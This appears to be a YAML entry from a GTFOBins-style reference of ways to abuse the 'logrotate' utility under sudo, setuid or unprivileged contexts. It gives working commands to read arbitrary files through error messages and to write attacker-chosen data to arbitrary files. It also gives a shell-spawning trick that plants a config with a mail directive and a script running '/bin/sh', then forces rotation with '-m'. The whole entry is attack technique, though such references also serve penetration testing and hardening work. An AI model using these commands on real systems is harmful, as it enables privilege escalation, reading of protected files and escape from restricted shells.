---
functions:
  file-read:
  - binary: false
    code: |-
      logrotate /path/to/input-file
    comment: |-
      The first word is returned in a error message.
    contexts:
      sudo:
      suid:
      unprivileged:
  file-write:
  - binary: false
    code: |-
      logrotate -l /path/to/output-file DATA
    comment: |-
      The content is written in a log file.
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      echo -e '/path/to/temp-file.config {\nmail x@x.x\n}' >/path/to/temp-file.config
      echo '/bin/sh 0<&2 1>&2' >/path/to/temp-file.sh
      logrotate -m /path/to/temp-file.sh -f /path/to/temp-file
    comment: |-
      This command is picky about file permissions. An existing config file can be used as weel, provided that it contains a mail directive.
    contexts:
      sudo:
...
